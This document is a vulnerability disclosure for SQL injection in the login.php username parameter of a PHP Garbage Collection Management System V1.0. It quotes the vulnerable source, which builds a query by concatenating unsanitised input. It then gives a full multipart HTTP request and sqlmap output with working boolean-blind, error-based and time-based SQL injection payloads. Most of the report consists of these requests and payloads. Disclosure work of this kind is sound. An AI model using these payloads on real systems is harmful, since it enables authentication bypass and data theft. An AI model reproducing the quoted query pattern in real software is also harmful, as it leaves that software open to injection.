#### BUG_AUTHOR：tangling
## Garbage Collection Management System - SQL Injection on (login.php username parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/14854/garbage-collection-management-system-php.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
login.php 

On this page, username parameter is vulnerable to SQL Injection Attack 
### Source code(Gabage/login.php):
```
$us=$_POST['username'];
$ps=$_POST['password'];
$sql=mysqli_query($con,"SELECT * FROM admin WHERE username='$us' AND password='$ps' AND acstatus='active'");
$rows=mysqli_num_rows($sql);
$det=mysqli_fetch_array($sql);
```
### Proof of vulnerability(Verify using the sqlmap tool):
#### Request:
```
POST /Gabage/login.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 558
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Origin: http://localhost
Referer: http://localhost/Gabage/
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="username"
Content-Type: form-data

admin
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="password"
Content-Type: form-data

admin
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="submit"
Content-Type: form-data

--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b--
```
### -> sqlmap -r 1.txt (above request package)--batch
#### Output:
```
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: --861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="username"
Content-Type: form-data

-6392' OR 3533=3533#
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="password"
Content-Type: form-data

admin
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="submit"
Content-Type: form-data


--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b--

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: --861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="username"
Content-Type: form-data

admin' OR (SELECT 9115 FROM(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(9115=9115,1))),0x717a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rFyM
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="password"
Content-Type: form-data

admin
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="submit"
Content-Type: form-data


--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: --861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="username"
Content-Type: form-data

admin' AND (SELECT 6308 FROM (SELECT(SLEEP(5)))pbGz)-- wtsj
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="password"
Content-Type: form-data

admin
--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b
Content-Disposition: form-data; name="submit"
Content-Type: form-data


--861b49c01ea7b566156f57d09afe922479cd8092e6553cb95f870f75315b--
---
```
